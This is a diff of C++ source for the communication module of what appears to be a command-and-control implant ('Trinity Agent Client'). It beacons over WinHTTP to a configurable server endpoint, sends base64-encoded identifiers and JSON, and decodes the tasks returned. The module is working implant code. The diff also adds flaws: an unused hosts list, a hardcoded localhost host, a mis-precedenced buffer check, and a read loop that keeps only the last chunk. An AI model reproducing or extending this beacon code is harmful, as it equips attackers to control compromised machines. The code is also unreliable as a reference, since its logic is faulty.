@@ -6,200 +6,130 @@
 #include <chrono>
 #include <windows.h>
 #include <winhttp.h>
+#include <vector>
 #pragma comment(lib, "winhttp.lib")
 
-#ifndef PAYLOAD_UUID
-	#define PAYLOAD_UUID "0c71632c-217f-46ce-bb81-dbfd32dd18ac"
-#endif
-
-#ifndef HOST
-	#define HOST "localhost"
-#endif
+#define WIDE_PREFIX_HELPER(x) L##x
+#define TO_WIDE_STRING(x) WIDE_PREFIX_HELPER(x)
 
 //^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
 // Default constructor 
 CommManager::CommManager()
 {
-	payloaddUUID = PAYLOAD_UUID;
-	host = HOST;
+	const std::vector<std::wstring> hosts = { COMM_HOSTS_LIST };
+	payloadUUID = COMM_PAYLOAD_UUID;
+	host = L"localhost";
 }
 
-//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Intial checkin 
 void CommManager::IntialCheckin(const std::string& json)
 {
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+	DWORD dwSize = 0, dwDownloaded = 0, dwOptionalLength = 0;
+	std::string strData;
 	BOOL bResults = FALSE;
-	DWORD dwSize = 0;
-	DWORD dwDownloaded = 0;
-	LPSTR Buffer = NULL;
-	std::string result;
+	LPSTR buffer = NULL;
+	LPVOID lpOptional;
 
 	hSession = WinHttpOpen(
-		L"Trinity Agent Client/1.0",
+		TO_WIDE_STRING(COMM_USER_AGENT),
 		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
 		WINHTTP_NO_PROXY_NAME,
 		WINHTTP_NO_PROXY_BYPASS, 0);
+	if (!hSession) goto e_func;
 
-	if (hSession)
-	{
-		std::wstring wideHost(host.begin(), host.end());
-		hConnect = WinHttpConnect(hSession, wideHost.c_str(), 5069, 0);
-	}
+	hConnect = WinHttpConnect(hSession, host.c_str(), COMM_PORT, 0);
+	if (!hConnect) goto e_func;
 
-	if (hConnect)
-	{
-		hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-	}
+	hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+	if (!hRequest) goto e_func;
 
-	LPCWSTR pwszHeaders = L"Content-Type: application/json\r\n";
-	std::string strData = base64::to_base64(payloaddUUID + json);
-	LPVOID lpOptional = (LPVOID)strData.c_str();
-	DWORD dwOptionalLength = (DWORD)strData.length();
+	strData = base64::to_base64(payloadUUID + json);
+	lpOptional = (LPVOID)strData.c_str();
+	dwOptionalLength = (DWORD)strData.length();
 
-	if (hRequest)
-	{
-		bResults = WinHttpSendRequest(
-			hRequest,
-			pwszHeaders,
-			(DWORD)-1L,
-			(LPVOID)strData.c_str(),
-			(DWORD)strData.length(),
-			(DWORD)strData.length(),
-			0);
-	}
+	bResults = WinHttpSendRequest(
+		hRequest,
+		TO_WIDE_STRING("Content-Type: application/json"),
+		(DWORD)-1L,
+		lpOptional,
+		dwOptionalLength,
+		dwOptionalLength,
+		0);
+	if (!bResults) goto e_func;
 
-	if (bResults)
+	if (WinHttpReceiveResponse(hRequest, NULL))
 	{
-		bResults = WinHttpReceiveResponse(hRequest, NULL);
-	}
-	if (bResults)
-	{
+		std::vector<char> buffer;
 		do {
 			dwSize = 0;
-			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-			{
-				std::cerr << "[x] Error " << GetLastError() << " in WinHttpQueryDataAvaliable.\n";
-			}
-			// No Tasks have been issued
+			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
 			if (dwSize == 0) break;
-
-			Buffer = new char[dwSize + 1];
-			if (!Buffer)
-			{
-				std::cerr << "[x] Could not allocate buffer. \n";
-				break;
-			}
-
-			ZeroMemory(Buffer, dwSize + 1);
-			if (!WinHttpReadData(hRequest, (LPVOID)Buffer, dwSize, &dwDownloaded))
-			{
-				std::cerr << "[x] Error " << GetLastError() << " in WinHttpReadData.\n";
-			}
-			else
-			{
-				std::cout << Buffer;
-			}
-
+			buffer = std::vector<char>(dwSize);
+			if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) break;
 		} while (dwSize > 0);
 
-		result = std::string(Buffer);
-		callbackUUID = base64::from_base64(result);
-		delete[] Buffer;
+		if (!buffer.size() > 0) goto e_func;
+		callbackUUID = base64::from_base64(std::string(buffer.begin(), buffer.end()));
 	}
+
+e_func:
 	if (hRequest) WinHttpCloseHandle(hRequest);
 	if (hConnect) WinHttpCloseHandle(hConnect);
 	if (hSession) WinHttpCloseHandle(hSession);
 }
 
-//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
-// Full-established checkin 
 std::string CommManager::Checkin(const std::string& json)
 {
 	HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+	DWORD dwSize = 0, dwDownloaded = 0, dwOptionalLength = 0;
+	std::string result, strData;
 	BOOL bResults = FALSE;
-	DWORD dwSize = 0;
-	DWORD dwDownloaded = 0;
-	LPSTR Buffer = NULL;
-	std::string result;
+	LPSTR buffer = NULL;
+	LPVOID lpOptional;
 
 	hSession = WinHttpOpen(
-		L"Trinity Agent Client/1.0",
+		TO_WIDE_STRING(COMM_USER_AGENT),
 		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
 		WINHTTP_NO_PROXY_NAME,
 		WINHTTP_NO_PROXY_BYPASS, 0);
+	if (!hSession) goto e_func;
 
-	if (hSession)
+	hConnect = WinHttpConnect(hSession, host.c_str(), COMM_PORT, 0);
+	if (!hConnect) goto e_func;
+
+	hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+	if (!hRequest) goto e_func;
+
+	strData = base64::to_base64(callbackUUID + json);
+	lpOptional = (LPVOID)strData.c_str();
+	dwOptionalLength = (DWORD)strData.length();
+
+	bResults = WinHttpSendRequest(
+		hRequest,
+		TO_WIDE_STRING("Content-Type: application/json"),
+		(DWORD)-1L,
+		lpOptional,
+		dwOptionalLength,
+		dwOptionalLength,
+		0);
+	if (!bResults) goto e_func;
+
+	if (WinHttpReceiveResponse(hRequest, NULL))
 	{
-		std::wstring wideHost(host.begin(), host.end());
-		hConnect = WinHttpConnect(hSession, wideHost.c_str(), 5069, 0);
-	}
-
-	if (hConnect)
-	{
-		hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/agents/checkin", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-	}
-
-	LPCWSTR pwszHeaders = L"Content-Type: application/json\r\n";
-
-
-	std::string strData = base64::to_base64(callbackUUID + json);
-	LPVOID lpOptional = (LPVOID)strData.c_str();
-	DWORD dwOptionalLength = (DWORD)strData.length();
-
-	if (hRequest)
-	{
-		bResults = WinHttpSendRequest(
-			hRequest,
-			pwszHeaders,
-			(DWORD)-1L,
-			(LPVOID)strData.c_str(),
-			(DWORD)strData.length(),
-			(DWORD)strData.length(),
-			0);
-	}
-
-	if (bResults)
-	{
-		bResults = WinHttpReceiveResponse(hRequest, NULL);
-	}
-	if (bResults)
-	{
+		std::vector<char> buffer;
 		do {
 			dwSize = 0;
-			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-			{
-				std::cerr << "[x] Error " << GetLastError() << " in WinHttpQueryDataAvaliable.\n";
-			}
-			// No Tasks have been issued
+			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
 			if (dwSize == 0) break;
-
-			Buffer = new char[dwSize + 1];
-			if (!Buffer)
-			{
-				std::cerr << "[x] Could not allocate buffer. \n";
-				break;
-			}
-
-			ZeroMemory(Buffer, dwSize + 1);
-			if (!WinHttpReadData(hRequest, (LPVOID)Buffer, dwSize, &dwDownloaded))
-			{
-				std::cerr << "[x] Error " << GetLastError() << " in WinHttpReadData.\n";
-			}
-			else
-			{
-				std::cout << Buffer;
-			}
-			
+			buffer = std::vector<char>(dwSize);
+			if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) break;
 		} while (dwSize > 0);
 
-		if (Buffer != NULL)
-		{
-			result = base64::from_base64(std::string(Buffer));
-		}
-
-		delete[] Buffer;
+		if (!buffer.size() > 0) goto e_func;
+		result = base64::from_base64(std::string(buffer.begin(), buffer.end()));
 	}
+
+e_func:
 	if (hRequest) WinHttpCloseHandle(hRequest);
 	if (hConnect) WinHttpCloseHandle(hConnect);
 	if (hSession) WinHttpCloseHandle(hSession);
